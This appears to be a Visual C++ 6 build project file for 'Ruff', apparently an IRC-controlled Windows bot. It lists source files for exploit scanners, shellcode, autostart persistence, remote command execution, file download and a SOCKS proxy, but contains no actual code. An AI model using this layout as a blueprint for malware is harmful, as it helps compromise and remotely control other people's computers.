# Microsoft Developer Studio Project File - Name="Ruff" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=Ruff - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "Ruff.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "Ruff.mak" CFG="Ruff - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "Ruff - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "Ruff - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "Ruff - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /I "C:\Program Files\Microsoft SDK\Include" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 /nologo /subsystem:windows /machine:I386
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "Ruff - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "temp"
# PROP BASE Intermediate_Dir "temp"
# PROP BASE Ignore_Export_Lib 0
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "temp"
# PROP Intermediate_Dir "temp"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /MTd /W3 /Gi /GX /Od /I "C:\Program Files\Mircosoft SDK\Include" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FR /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib wsock32.lib wininet.lib /nologo /subsystem:windows /machine:I386 /align:4096
# SUBTRACT BASE LINK32 /pdb:none
# ADD LINK32 /nologo /subsystem:windows /profile /map /debug /machine:I386

!ENDIF 

# Begin Target

# Name "Ruff - Win32 Release"
# Name "Ruff - Win32 Debug"
# Begin Group "Ruff"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "AdvScan"

# PROP Default_Filter ""
# Begin Group "Scanners"

# PROP Default_Filter ".cpp"
# Begin Source File

SOURCE=.\code\massasn.cpp
# End Source File
# Begin Source File

SOURCE=.\code\ms04_007_asn1.cpp
# End Source File
# Begin Source File

SOURCE=.\code\veritas.cpp
# End Source File
# End Group
# Begin Group "Ftpd"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\code\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\code\httpd.cpp
# End Source File
# End Group
# Begin Group "Tftp"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\code\tftpd.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\code\advscan.cpp
# End Source File
# End Group
# Begin Group "Proxy's"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\code\socks4.cpp
# End Source File
# End Group
# Begin Group "Tools"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\code\loaddlls.cpp
# End Source File
# Begin Source File

SOURCE=.\code\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\code\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\code\remotecmd.cpp
# End Source File
# Begin Source File

SOURCE=.\code\sysinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\code\visit.cpp
# End Source File
# End Group
# Begin Group "Ruff Main"

# PROP Default_Filter ""
# Begin Group "config"

# PROP Default_Filter "h"
# Begin Source File

SOURCE=.\config\configs.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\code\aliaslog.cpp
# End Source File
# Begin Source File

SOURCE=.\code\autostart.cpp
# End Source File
# Begin Source File

SOURCE=.\code\crc32.cpp
# End Source File
# Begin Source File

SOURCE=.\code\crypt.cpp
# End Source File
# Begin Source File

SOURCE=.\code\dcc.cpp
# End Source File
# Begin Source File

SOURCE=.\code\download.cpp
# End Source File
# Begin Source File

SOURCE=.\code\driveinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\code\ehandler.cpp
# End Source File
# Begin Source File

SOURCE=.\code\fphost.cpp
# End Source File
# Begin Source File

SOURCE=.\code\ident.cpp
# End Source File
# Begin Source File

SOURCE=.\code\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\code\net.cpp
# End Source File
# Begin Source File

SOURCE=.\code\processes.cpp
# End Source File
# Begin Source File

SOURCE=.\code\random.cpp
# End Source File
# Begin Source File

SOURCE=.\code\rlogind.cpp
# End Source File
# Begin Source File

SOURCE=.\code\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\code\Ruff.cpp
# End Source File
# Begin Source File

SOURCE=.\code\scan.cpp
# End Source File
# Begin Source File

SOURCE=.\code\secure.cpp
# End Source File
# Begin Source File

SOURCE=.\code\session.cpp
# End Source File
# Begin Source File

SOURCE=.\code\shellcode.cpp
# End Source File
# Begin Source File

SOURCE=.\code\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\code\wildcard.cpp
# End Source File
# End Group
# End Group
# Begin Group "Header's"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\header\advscan.h
# End Source File
# Begin Source File

SOURCE=.\header\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\header\autostart.h
# End Source File
# Begin Source File

SOURCE=.\header\crc32.h
# End Source File
# Begin Source File

SOURCE=.\header\crypt.h
# End Source File
# Begin Source File

SOURCE=.\header\dcc.h
# End Source File
# Begin Source File

SOURCE=.\header\defines.h
# End Source File
# Begin Source File

SOURCE=.\header\download.h
# End Source File
# Begin Source File

SOURCE=.\header\driveinfo.h
# End Source File
# Begin Source File

SOURCE=.\header\ehandler.h
# End Source File
# Begin Source File

SOURCE=.\header\externs.h
# End Source File
# Begin Source File

SOURCE=.\header\fphost.h
# End Source File
# Begin Source File

SOURCE=.\header\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\header\functions.h
# End Source File
# Begin Source File

SOURCE=.\header\globals.h
# End Source File
# Begin Source File

SOURCE=.\header\httpd.h
# End Source File
# Begin Source File

SOURCE=.\header\ident.h
# End Source File
# Begin Source File

SOURCE=.\header\includes.h
# End Source File
# Begin Source File

SOURCE=.\header\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\header\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\header\massasn.h
# End Source File
# Begin Source File

SOURCE=.\header\misc.h
# End Source File
# Begin Source File

SOURCE=.\header\ms04_007_asn1.h
# End Source File
# Begin Source File

SOURCE=.\header\net.h
# End Source File
# Begin Source File

SOURCE=.\header\netutils.h
# End Source File
# Begin Source File

SOURCE=.\header\nicklist.h
# End Source File
# Begin Source File

SOURCE=.\header\passwd.h
# End Source File
# Begin Source File

SOURCE=.\header\processes.h
# End Source File
# Begin Source File

SOURCE=.\header\random.h
# End Source File
# Begin Source File

SOURCE=.\recource\recource.rc
# End Source File
# Begin Source File

SOURCE=.\header\remotecmd.h
# End Source File
# Begin Source File

SOURCE=.\header\resource.h
# End Source File
# Begin Source File

SOURCE=.\header\rlogind.h
# End Source File
# Begin Source File

SOURCE=.\header\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\header\Ruff.h
# End Source File
# Begin Source File

SOURCE=.\header\scan.h
# End Source File
# Begin Source File

SOURCE=.\header\secure.h
# End Source File
# Begin Source File

SOURCE=.\header\session.h
# End Source File
# Begin Source File

SOURCE=.\header\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\header\socks4.h
# End Source File
# Begin Source File

SOURCE=.\header\sysinfo.h
# End Source File
# Begin Source File

SOURCE=.\header\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\header\tftpd.h
# End Source File
# Begin Source File

SOURCE=.\header\threads.h
# End Source File
# Begin Source File

SOURCE=.\header\veritas.h
# End Source File
# Begin Source File

SOURCE=.\header\visit.h
# End Source File
# Begin Source File

SOURCE=.\header\wildcard.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=.\recource\kcounterx.ICO
# End Source File
# End Group
# End Target
# End Project
